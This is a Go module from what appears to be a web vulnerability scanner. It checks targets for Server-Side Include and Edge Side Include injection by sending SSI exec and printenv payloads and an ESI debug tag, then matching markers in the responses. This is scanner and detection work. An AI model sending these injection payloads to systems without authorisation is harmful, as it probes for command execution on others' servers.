package vulns

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/areksaxyz/bhyakugan/internal/core"
)

type SSIPayload struct {
	Name    string
	Payload string
	Check   string
}

var SSIPayloads = []SSIPayload{
	{"SSI Exec (ID)", "?ssi=<!--#exec cmd=\"id\" -->", "uid="},
	{"SSI PrintEnv", "?ssi=<!--#printenv -->", "DOCUMENT_ROOT"},
	{"ESI Debug", "?ssi=<esi:debug/>", "ESI Debug"},
}

// ScanSSI tests for SSI and ESI Injection
func ScanSSI(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	for _, p := range SSIPayloads {
		target := baseURL + p.Payload

		resp, err := client.Get(target)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
		bodyStr := string(body)
		lowerBody := strings.ToLower(bodyStr)
		payloadLower := strings.ToLower(p.Payload)

		if strings.Contains(bodyStr, p.Check) {
			// Anti-reflection: avoid reporting when payload is merely echoed back.
			if strings.Contains(lowerBody, payloadLower) {
				continue
			}
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", p.Name, target)
			onFound(core.Finding{
				Type:     "SSI/ESI Injection",
				Target:   target,
				Detail:   fmt.Sprintf("%s detected. Found: %s", p.Name, p.Check),
				Severity: "Critical",
			})
		}
	}
}
